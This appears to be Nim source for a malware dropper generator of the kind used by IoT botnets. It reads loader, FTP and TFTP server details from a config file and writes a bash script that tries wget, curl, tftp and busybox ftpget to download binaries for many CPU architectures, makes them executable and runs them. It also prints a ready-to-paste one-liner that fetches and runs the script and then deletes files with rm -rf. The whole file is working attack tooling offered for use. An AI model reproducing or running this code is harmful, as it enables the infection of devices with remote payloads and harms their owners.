import os
import parsetoml

import strutils
import httpclient
import json

var ftplog, ftppass, loaderserver, shell_name, binaryname, ftp, tftp: string
var shnamesecond: string


let archs = [
  "arm5.bin",
  "arm6.bin",
  "x32.bin",
  "x86_64.bin",
  "arm7.bin",
  "mips.bin",
  "mips32le.bin",
  "mips64le.bin",
  "ppc64.bin",
  "riscv.bin",
  "s390x.bin",
  ]


proc getIp(): string =
    var client = newHttpClient()
    let response = client.get("http://ip-api.com/json/?fields=query")
    let data = response.body.parseJson()
    let ip = data["query"].str
    return ip




proc config() =
  let config = parsetoml.parseFile("./config.toml")

  let temp_shell_name = config["Payload"]["ShellName"].getStr()
  ftplog = config["Payload"]["FtpLogin"].getStr()
  ftppass = config["Payload"]["FtpPassword"].getStr()
  binaryname = config["Payload"]["BinaryName"].getStr()
  loaderserver = config["LoaderServer"].getStr()
  ftp = config["FtpServer"].getStr()
  tftp = config["TftpServer"].getStr()

  shnamesecond = temp_shell_name
  shell_name = "./bin/" & temp_shell_name
  loaderserver = loaderserver.replace("0.0.0.0",getIp())
  ftp = ftp.replace("0.0.0.0",getIp())
  tftp = tftp.replace("0.0.0.0",getIp())







proc create(): string =
  removeFile(shell_name)
  let file = open(shell_name, fmAppend)
  file.writeLine("#!/bin/bash")
  for i in archs:

    let tftpsplit = split(tftp, ":")
    let ftpsplit = split(ftp, ":")

    file.writeLine("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" &
        loaderserver & "/" & i & " ||  curl -O http://" &
        loaderserver & "/" & i &
        " || tftp " & tftpsplit[0] & " " & tftpsplit[1] & " -c get ./bin/" & i &
            " " & i & " || ftpget -v -u " & ftplog &
                " -p " & ftppass & " -P " & ftpsplit[
                    1] & " " & ftpsplit[0] & " " & i &
                        " || busybox ftpget -v -u " & ftplog &
                " -p " & ftppass & " -P " & ftpsplit[
                    1] & " " & ftpsplit[0] & " " & i & "; cat " & i &
                        " > " & binaryname & "; chmod +x *; ./" & binaryname)

  file.close()
  let tftpsplit = split(tftp, ":")
  let ftpsplit = split(ftp, ":")
  let _ = os.execShellCmd("clear")

  echo "\n=============== YOUR PAYLOAD ===============\n\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" &
        loaderserver & "/" & shnamesecond & " || " & "curl -O http://" &
        loaderserver & "/" & shnamesecond & " || tftp " & tftpsplit[0] & " " &
            tftpsplit[1] & " -c get ./bin/" & shnamesecond & " " &
                shnamesecond & " || ftpget -v -u " & ftplog & " -p " & ftppass &
                    " -P " & ftpsplit[1] & " " & ftpsplit[0] & " " &
                        shnamesecond & " || busybox ftpget -v -u " & ftplog &
                " -p " & ftppass & " -P " & ftpsplit[
                    1] & " " & ftpsplit[0] & " " & shnamesecond &
                        " ; chmod 777 " & shnamesecond & "; sh " &
                            shnamesecond & " || bash " & shnamesecond &
                                " || ./" & shnamesecond & "; rm -rf *"

config()
let _ = create()
